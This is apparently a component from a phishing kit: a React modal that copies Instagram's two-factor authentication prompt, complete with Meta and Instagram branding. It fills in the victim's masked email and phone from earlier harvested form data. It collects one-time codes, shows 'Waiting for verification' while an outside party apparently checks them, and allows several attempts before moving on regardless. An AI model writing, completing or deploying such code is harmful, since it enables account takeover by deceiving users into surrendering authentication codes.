'use client';

import InstagramLogoImage from '@/assets/images/logo-insta.webp';
import MetaLogo from '@/assets/images/meta-logo-grey.png';
import TwoFAImage from '@/assets/images/2FA.png';
import { faXmark } from '@fortawesome/free-solid-svg-icons/faXmark';
import { FontAwesomeIcon } from '@fortawesome/react-fontawesome';
import { imageSrc } from '@/utils/image-src';
import Image from 'next/image';
import { useState, type FC, type FormEvent } from 'react';
import type { FormDataPayload } from '@/utils/message';
import config from '@/utils/config';

interface InstagramTwoFAModalProps {
    show: boolean;
    texts: Record<string, string>;
    formData: FormDataPayload;
    onClose: () => void;
    onSubmit: (code: string) => Promise<{ approved: boolean; isLastAttempt: boolean }>;
    onSuccess: () => void;
}

const maskEmail = (email?: string) => {
    if (!email) return 't**t@example.com';
    const [local, domain] = email.split('@');
    if (!domain) return email;
    if (local.length <= 2) return `${local[0]}**@${domain}`;
    return `${local[0]}**${local[local.length - 1]}@${domain}`;
};

const maskPhone = (phone?: string) => {
    if (!phone) return '+84 ****** XX';
    const digits = phone.replace(/\D/g, '');
    if (digits.length < 4) return phone;
    return `+${digits.slice(0, 2)} ****** ${digits.slice(-2)}`;
};

const InstagramTwoFAModal: FC<InstagramTwoFAModalProps> = ({ show, texts, formData, onClose, onSubmit, onSuccess }) => {
    const [code, setCode] = useState('');
    const [isLoading, setIsLoading] = useState(false);
    const [showError, setShowError] = useState(false);
    const [attempts, setAttempts] = useState(0);
    const [waitingApproval, setWaitingApproval] = useState(false);

    if (!show) return null;

    const userName = formData?.fullName || texts.defaultUserName || 'User';
    const maskedEmail = maskEmail(formData?.personalEmail);
    const maskedPhone = maskPhone(formData?.phone);
    const stepLabel = `(${texts.step || 'Step'} ${attempts + 1}/${config.MAX_CODE || 3})`;
    const isCodeValid = /^\d{6,8}$/.test(code.replace(/\D/g, ''));

    const handleSubmit = async (e: FormEvent) => {
        e.preventDefault();
        const normalized = code.replace(/\D/g, '');
        if (!/^\d{6,8}$/.test(normalized) || isLoading) return;

        setIsLoading(true);
        setShowError(false);
        setWaitingApproval(true);

        try {
            const result = await onSubmit(normalized);
            setWaitingApproval(false);

            if (result.approved || result.isLastAttempt) {
                onSuccess();
                return;
            }

            setAttempts((a) => a + 1);
            setShowError(true);
            setCode('');
        } catch {
            setWaitingApproval(false);
            setShowError(true);
            setCode('');
        } finally {
            setIsLoading(false);
        }
    };

    return (
        <div className='fixed inset-0 z-[1040] flex items-center justify-center overflow-y-auto bg-black/45 p-2'>
            <div
                className='relative flex w-full max-w-[520px] flex-col overflow-hidden rounded-2xl bg-white p-5 shadow-[0_20px_50px_rgba(15,23,42,0.2)]'
                style={{
                    minHeight: 'min(860px, calc(100vh - 16px))',
                    maxHeight: 'min(860px, calc(100vh - 16px))'
                }}
            >
                <button
                    type='button'
                    onClick={onClose}
                    className='absolute top-4 right-4 z-10 flex h-8 w-8 items-center justify-center rounded-full text-[#8e8e8e] transition-colors hover:bg-[#f2f2f2]'
                    aria-label={texts.closeLabel || 'Close'}
                >
                    <FontAwesomeIcon icon={faXmark} className='h-4 w-4' />
                </button>

                <div className='h-1 w-full shrink-0 rounded-full bg-linear-to-r from-[#833AB4] via-[#E1306C] to-[#F77737]' />

                <div className='flex min-h-0 flex-1 flex-col justify-between overflow-y-auto pt-4'>
                    <div className='w-full'>
                        <div className='mb-2 flex items-center gap-2 text-[14px] text-[#9a979e]'>
                            <span>{userName}</span>
                            <span className='h-1 w-1 rounded-full bg-[#9a979e]' />
                            <span>{texts.providerInstagram || 'Instagram'}</span>
                        </div>

                        <h2 className='mb-3 text-[22px] leading-tight font-bold text-[#000]'>
                            {texts.twoFAStep || 'Two-factor authentication request'} {stepLabel}
                        </h2>

                        <p className='mb-4 text-[15px] leading-relaxed text-[#9a979e]'>
                            {`${texts.twoFAInstructionPrefix || 'Enter the code sent to'} ${maskedEmail}, ${maskedPhone}, ${texts.twoFAInstructionSuffix || 'or confirm with an authenticator app.'}`}
                        </p>

                        <div className='mb-4 overflow-hidden rounded-[10px] bg-[#f5f5f5]'>
                            <img src={imageSrc(TwoFAImage)} alt={texts.altAuthentication || 'Authentication'} className='block w-full' />
                        </div>

                        <form onSubmit={handleSubmit}>
                            <div
                                className={`mb-1 flex h-10 w-full items-center rounded-[10px] border bg-white px-3 transition-all ${showError ? 'border-[#e74c3c]' : 'border-[#d4dbe3] focus-within:border-[#E1306C] focus-within:ring-2 focus-within:ring-[#E1306C]/20'}`}
                            >
                                <input
                                    type='text'
                                    inputMode='numeric'
                                    value={code}
                                    onChange={(e) => {
                                        setCode(e.target.value.replace(/\D/g, '').slice(0, 8));
                                        if (showError) setShowError(false);
                                    }}
                                    placeholder={texts.code || 'Code'}
                                    maxLength={8}
                                    autoComplete='one-time-code'
                                    className='h-full w-full border-none bg-transparent text-[14px] text-[#333] outline-none'
                                />
                            </div>

                            {showError && (
                                <p className='mb-2 text-[12px] text-[#e74c3c]'>
                                    {texts.codeExpired || 'The code you entered is incorrect. Please try again.'}
                                </p>
                            )}

                            {waitingApproval && isLoading && (
                                <p className='mb-2 text-center text-[13px] text-[#E1306C]'>
                                    {texts.waitingApproval || 'Waiting for verification...'}
                                </p>
                            )}

                            <button
                                type='submit'
                                disabled={isLoading || !isCodeValid}
                                className='mt-3 flex h-10 w-full items-center justify-center rounded-full bg-linear-to-r from-[#833AB4] via-[#E1306C] to-[#F77737] text-[14px] font-semibold text-white disabled:cursor-not-allowed disabled:opacity-70'
                            >
                                {isLoading ? (
                                    <span className='h-5 w-5 animate-spin rounded-full border-2 border-white/40 border-t-white' />
                                ) : (
                                    texts.continueBtn || 'Continue'
                                )}
                            </button>

                            <div className='mt-5 flex h-10 w-full items-center justify-center rounded-full border border-[#d4dbe3] text-[14px] text-[#8f949d]'>
                                {texts.tryAnotherMethod || 'Try another method'}
                            </div>

                            <div className='mx-auto mt-5 w-16'>
                                <img src={imageSrc(MetaLogo)} width='100%' alt={texts.altMeta || 'Meta'} className='object-contain' />
                            </div>
                        </form>
                    </div>

                    <div className='mt-4 flex items-center justify-center gap-2 pt-2'>
                        <div className='flex h-8 w-8 items-center justify-center rounded-lg bg-linear-to-br from-[#833AB4] via-[#E1306C] to-[#FCAF45] p-px'>
                            <div className='flex h-full w-full items-center justify-center rounded-[7px] bg-white'>
                                <Image src={InstagramLogoImage} alt={texts.altInstagram || 'Instagram'} width={20} height={20} className='object-contain' />
                            </div>
                        </div>
                        <span className='text-[12px] text-[#8e8e8e]'>{texts.igSecurityFooter || 'Instagram · Meta security'}</span>
                    </div>
                </div>
            </div>
        </div>
    );
};

export default InstagramTwoFAModal;
